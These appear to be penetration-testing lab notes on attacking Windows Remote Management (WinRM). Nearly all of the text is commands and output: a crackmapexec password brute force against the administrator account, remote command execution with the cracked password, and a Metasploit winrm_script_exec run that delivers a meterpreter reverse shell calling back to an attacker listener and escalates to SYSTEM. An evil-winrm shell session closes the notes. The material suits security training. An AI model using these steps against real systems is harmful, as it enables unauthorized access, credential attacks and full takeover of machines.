
### WinRM
Windoes Remote Management

## Brute Force

### crackmapexec

```bash
root@attackdefense:~# crackmapexec winrm $target -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
WINRM       10.4.28.113     5985   NONE             [*] http://10.4.28.113:5985/wsman
WINRM       10.4.28.113     5985   NONE             [-] None\administrator:admin "Failed to authenticate the user administrator with ntlm"
WINRM       10.4.28.113     5985   NONE             [-] None\administrator:123456 "Failed to authenticate the user administrator with ntlm"
WINRM       10.4.28.113     5985   NONE             [-] None\administrator:12345 "Failed to authenticate the user administrator with ntlm"
WINRM       10.4.28.113     5985   NONE             [-] None\administrator:123456789 "Failed to authenticate the user administrator with ntlm"

...

WINRM       10.4.28.113     5985   NONE             [-] None\administrator:hottie "Failed to authenticate the user administrator with ntlm"
WINRM       10.4.28.113     5985   NONE             [+] None\administrator:tinkerbell (Pwn3d!)
```

## Run Commands

### crackmapexec

```bash
root@attackdefense:~# crackmapexec winrm $target -u administrator -p tinkerbell -x "whoami"
WINRM       10.4.28.113     5985   NONE             [*] http://10.4.28.113:5985/wsman
WINRM       10.4.28.113     5985   NONE             [+] None\administrator:tinkerbell (Pwn3d!)
WINRM       10.4.28.113     5985   NONE             [+] Executed command
WINRM       10.4.28.113     5985   NONE             server\administrator

root@attackdefense:~# crackmapexec winrm $target -u administrator -p tinkerbell -x "systeminfo"
WINRM       10.4.28.113     5985   NONE             [*] http://10.4.28.113:5985/wsman
WINRM       10.4.28.113     5985   NONE             [+] None\administrator:tinkerbell (Pwn3d!)
WINRM       10.4.28.113     5985   NONE             [+] Executed command
WINRM       10.4.28.113     5985   NONE
Host Name:                 SERVER
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00430-00000-00000-AA975
Original Install Date:     10/1/2020, 2:03:19 PM
System Boot Time:          1/24/2024, 10:51:51 AM
System Manufacturer:       Amazon EC2
System Model:              t3.medium
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 4 GenuineIntel ~2500 Mhz
BIOS Version:              Amazon EC2 1.0, 10/16/2017
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     4,036 MB
Available Physical Memory: 2,736 MB
Virtual Memory: Max Size:  5,444 MB
Virtual Memory: Available: 4,285 MB
Virtual Memory: In Use:    1,159 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\SERVER
Hotfix(s):                 20 Hotfix(s) Installed.
                           [01]: KB4570720
                           [02]: KB4470502
                           [03]: KB4470788
...
                           [20]: KB4570333
Network Card(s):           1 NIC(s) Installed.
                           [01]: Amazon Elastic Network Adapter
                                 Connection Name: Ethernet 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.4.16.1
                                 IP address(es)
                                 [01]: 10.4.28.113
                                 [02]: fe80::cdda:74c:854d:b92e
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

### Metasploit

```bash
msf5 > use exploit/windows/winrm/winrm_script_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf5 exploit(windows/winrm/winrm_script_exec) > options

Module options (exploit/windows/winrm/winrm_script_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DOMAIN     WORKSTATION      yes       The domain to use for Windows authentification
   FORCE_VBS  false            yes       Force the module to use the VBS CmdStager
   PASSWORD                    yes       A specific password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      5985             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URI        /wsman           yes       The URI of the WinRM service
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME                    yes       A specific username to authenticate as
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.80.6       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf5 exploit(windows/winrm/winrm_script_exec) > set RHOSTS 10.4.28.113
RHOSTS => 10.4.28.113

msf5 exploit(windows/winrm/winrm_script_exec) > set USERNAME administrator
USERNAME => administrator

msf5 exploit(windows/winrm/winrm_script_exec) > set PASSWORD tinkerbell
PASSWORD => tinkerbell

msf5 exploit(windows/winrm/winrm_script_exec) > set FORCE_VBS true
FORCE_VBS => true

msf5 exploit(windows/winrm/winrm_script_exec) > exploit

[*] Started reverse TCP handler on 10.10.80.6:4444
[*] User selected the FORCE_VBS option
[*] Command Stager progress -   2.01% done (2046/101936 bytes)
[*] Command Stager progress -   4.01% done (4092/101936 bytes)
...
[*] Command Stager progress -  98.35% done (100252/101936 bytes)
[*] Sending stage (176195 bytes) to 10.4.28.113
[*] Meterpreter session 1 opened (10.10.80.6:4444 -> 10.4.28.113:49821) at 2024-01-24 16:41:09 +0530
[*] Session ID 1 (10.10.80.6:4444 -> 10.4.28.113:49821) processing InitialAutoRunScript 'post/windows/manage/priv_migrate'
[*] Current session process is xoriz.exe (3580) as: SERVER\Administrator
[*] Session is Admin but not System.
[*] Will attempt to migrate to specified System level process.
[-] Could not migrate to services.exe.
[-] Could not migrate to wininit.exe.
[*] Trying svchost.exe (700)
[+] Successfully migrated to svchost.exe (700) as: NT AUTHORITY\SYSTEM
[*] nil
[*] Command Stager progress - 100.00% done (101936/101936 bytes)

meterpreter > sysinfo
Computer        : SERVER
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## Connect

### evil-winrm

```bash
root@attackdefense:~# evil-winrm.rb -u administrator -p tinkerbell -i $target

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
server\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . : ec2.internal
   Link-local IPv6 Address . . . . . : fe80::cdda:74c:854d:b92e%8
   IPv4 Address. . . . . . . . . . . : 10.4.28.113
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.4.16.1
*Evil-WinRM* PS C:\Users\Administrator\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            auditor                  DefaultAccount
demo                     Guest                    sysadmin
WDAGUtilityAccount
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
